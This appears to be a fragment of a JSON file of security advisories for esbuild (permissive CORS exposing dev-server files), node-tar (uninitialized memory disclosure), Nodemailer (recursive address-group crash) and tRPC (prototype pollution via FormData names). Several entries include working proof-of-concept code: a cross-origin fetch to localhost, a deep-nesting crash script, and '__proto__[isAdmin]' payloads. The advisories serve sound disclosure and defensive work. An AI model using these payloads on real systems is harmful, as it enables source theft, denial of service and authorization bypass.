      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",

Uninitialized memory can contain unrelated file contents, environment variables, passwords, etc.\n\nTo execute, an attacker must reduce the file size to boundary between a tar header and body block, in the time between when the tar archive file size is read via `stat`, and the time when the tar archive parser reaches the entry that is truncated. If the file is truncated at a different boundary, then the uninitialized data will very likely not be a valid tar entry, causing the parser to treat the entry as a damaged archive (that is, throwing an error in `strict: true` mode, or by default, skipping the entry harmlessly).\n\nThis is conditional on using the `sync: true` option to the `tar.list`/`tar.t` method, and the `7.5.1` version specifically. Earlier versions were not affected.\n\nThis is also conditional to attacker being able to truncate (or induce a truncation/replacement) of a file on disk (e.g. in cache).\n\nIf the tar file is initially larger than the `opt.maxReadSize` (16kb by default), then uninitialized memory is not exposed to user code, and instead the program enters an infinite loop, causing a DoS rather than an information disclosure vulnerability.\n\nBy default, `tar.list` does _not_ process tar archive entry body content. So, this is further conditional on the user code doing something with the tar entry file contents in an `onReadEntry` method which would expose the file contents (for example, attempting to parse them in such a way that the uninitialized data could appear in an error message).\n\nOther methods in this library (`tar.extract`, etc.) are not affected by this vulnerability.",

      "overview": "### Summary\nA DoS can occur that immediately halts the system due to the use of an unsafe function.\n\n### Details\nAccording to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.\nHowever, the code implemented for this flattening process can be exploited by malicious input and triggers DoS\n\nRFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.\nAt the following location in lib/addressparser/index.js:\n\nhttps://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90\n\nthere is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:\n\n```g0: g1: g2: g3: ... gN: victim@example.com;```\n\nBecause no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern\n`addressparser → _handleAddress → addressparser → ...`\nfor each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.\n\nThe problematic code section is as follows:\n```js\nif (isGroup) {\n    ...\n    if (data.group.length) {\n        let parsedGroup = addressparser(data.group.join(',')); // <- boom!\n        parsedGroup.forEach(member => {\n            if (member.group) {\n                groupMembers = groupMembers.concat(member.group);\n            } else {\n                groupMembers.push(member);\n            }\n        });\n    }\n}\n```\n`data.group` is expected to contain members separated by commas, but in the attacker’s payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.\n\n### PoC\n\n```\nconst nodemailer = require('nodemailer');\n\nfunction buildDeepGroup(depth) {\n  let parts = [];\n  for (let i = 0; i < depth; i++) {\n    parts.push(`g${i}:`);\n  }\n  return parts.join(' ') + ' user@example.com;';\n}\n\nconst DEPTH = 3000; // <- control depth \nconst toHeader = buildDeepGroup(DEPTH);\nconsole.log('to header length:', toHeader.length);\n\nconst transporter = nodemailer.createTransport({\n  streamTransport: true,\n  buffer: true,\n  newline: 'unix'\n});\n\nconsole.log('parsing start');\n\ntransporter.sendMail(\n  {\n    from: 'test@example.com',\n    to: toHeader,\n    subject: 'test',\n    text: 'test'\n  },\n  (err, info) => {\n    if (err) {\n      console.error('error:', err);\n    } else {\n      console.log('finished :', info && info.envelope);\n    }\n  }\n);\n```\nAs a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.\n\n### Impact\nThe attacker can achieve the following:\n\n1. Force an immediate crash of any server/service that uses Nodemailer\n2. Kill the backend process with a single web request\n3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”",

An attacker can pollute `Object.prototype` by submitting specially crafted FormData field names, potentially leading to authorization bypass, denial of service, or other security impacts.\n\n## Affected Versions\n\n- **Package:** `@trpc/server`\n- **Affected Versions:** >=10.27.0\n- **Vulnerable Component:** `formDataToObject()` in `src/unstable-core-do-not-import/http/formDataToObject.ts`\n\n## Vulnerability Details\n\n### Root Cause\n\nThe `set()` function in `formDataToObject.ts` recursively processes FormData field names containing bracket/dot notation (e.g., `user[name]`, `user.address.city`) to create nested objects. However, it does **not** validate or sanitize dangerous keys like `__proto__`, `constructor`, or `prototype`.\n\n### Vulnerable Code\n\n```typescript\n// packages/server/src/unstable-core-do-not-import/http/formDataToObject.ts\nfunction set(obj, path, value) {\n  if (path.length > 1) {\n    const newPath = [...path];\n    const key = newPath.shift();  // ← No validation of dangerous keys\n    const nextKey = newPath[0];\n\n    if (!obj[key]) {  // ← Accesses obj[\"__proto__\"] which returns Object.prototype\n      obj[key] = isNumberString(nextKey) ? [] : {};\n    }\n    \n    set(obj[key], newPath, value);  // ← Recursively pollutes Object.prototype\n    return;\n  }\n  // ...\n}\n\nexport function formDataToObject(formData) {\n  const obj = {};\n  for (const [key, value] of formData.entries()) {\n    const parts = key.split(/[\\.\\[\\]]/).filter(Boolean);  // Splits \"__proto__[isAdmin]\" → [\"__proto__\", \"isAdmin\"]\n    set(obj, parts, value);\n  }\n  return obj;\n}\n```\n\n### Attack Vector\n\nWhen a user submits a form to a tRPC mutation using Next.js Server Actions, the `nextAppDirCaller` adapter processes the FormData:\n\n```typescript\n// packages/server/src/adapters/next-app-dir/nextAppDirCaller.ts:88-89\nif (normalizeFormData && input instanceof FormData) {\n  input = formDataToObject(input);  // ← Vulnerable call\n}\n```\n\nAn attacker can craft FormData with malicious field names:\n\n```javascript\nconst formData = new FormData();\nformData.append(\"__proto__[isAdmin]\", \"true\");\nformData.append(\"__proto__[role]\", \"superadmin\");\n```\n\nWhen processed, this pollutes `Object.prototype`:\n\n```javascript\n{}.isAdmin        // → \"true\"\n{}.role           // → \"superadmin\"\n```\n\n## Proof of Concept\n\n```bash\n# Step 1: Create the project directory\n\nmkdir trpc-vuln-poc\ncd trpc-vuln-poc\n\n# Step 2: Initialize npm\n\nnpm init -y\n\n# Step 3: Install vulnerable tRPC\n\nnpm install @trpc/server@11.7.2\n\n# Step 4: Create the test file \n```\n---\n\n### Test.js\n\n```javascript\nconst { formDataToObject } = require('@trpc/server/unstable-core-do-not-import');\n\nconsole.log(\"=== PoC Prototype Pollution en tRPC ===\\n\");\n\nconsole.log(\"[1] Estado inicial:\");\nconsole.log(\"    {}.isAdmin =\", {}.isAdmin);\n\nconst fd = new FormData();\nfd.append(\"__proto__[isAdmin]\", \"true\");\nfd.append(\"__proto__[role]\", \"superadmin\");\nfd.append(\"username\", \"attacker\");\n\nconsole.log(\"\\n[2] FormData malicioso:\");\nconsole.log('    __proto__[isAdmin] = \"true\"');\nconsole.log('    __proto__[role] = \"superadmin\"');\n\nconsole.log(\"\\n[3] Llamando formDataToObject()...\");\nconst result = formDataToObject(fd);\nconsole.log(\"    Resultado:\", JSON.stringify(result));\n\nconsole.log(\"\\n[4] Después del ataque:\");\nconsole.log(\"    {}.isAdmin =\", {}.isAdmin);\nconsole.log(\"    {}.role =\", {}.role);\n\nconst user = { id: 1, name: \"john\" };\nconsole.log(\"\\n[5] Impacto en autorización:\");\nconsole.log(\"    Usuario normal:\", JSON.stringify(user));\nconsole.log(\"    user.isAdmin =\", user.isAdmin);\n\nif (user.isAdmin) {\n    console.log(\"\\n    VULNERABLE - Authorization bypass exitoso!\");\n} else {\n    console.log(\"\\n    ✓ Seguro\");\n}\n```\n\n## Impact\n\n### Authorization Bypass (HIGH)\n\nMany applications check user permissions using property access:\n\n```javascript\n// Vulnerable pattern\nif (user.isAdmin) {\n  // Grant admin access\n}\n```\n\nAfter pollution, **all objects** will have `isAdmin: \"true\"`, bypassing authorization.\n\n### Denial of Service (MEDIUM)\n\nPolluting commonly used property names can crash applications:\n\n```javascript\nformData.append(\"__proto__[toString]\", \"not_a_function\");\n// All subsequent .toString() calls will fail\n```",
